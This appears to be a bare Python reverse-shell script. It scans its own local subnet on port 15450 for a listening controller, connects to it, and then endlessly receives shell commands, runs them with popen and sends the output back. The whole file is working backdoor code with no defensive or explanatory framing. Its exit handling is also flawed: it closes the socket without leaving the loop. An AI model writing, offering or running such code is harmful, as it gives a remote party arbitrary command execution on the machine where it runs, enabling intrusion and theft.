import socket	
from os import popen

s = socket.socket()		
ip=(popen("hostname -I | awk '{print $1}'").read()).strip()
port = 15450			

for i in range(100):
    temip=ip[:-1]+str(i)
    try:
        s.connect((temip, port))
        break
    except (ConnectionRefusedError,OSError):
        pass

while True:
    cmd=s.recv(1024).decode()
    if cmd == "exit server":
        s.close()
    k=popen(cmd).read()
    s.sendall(k.encode())
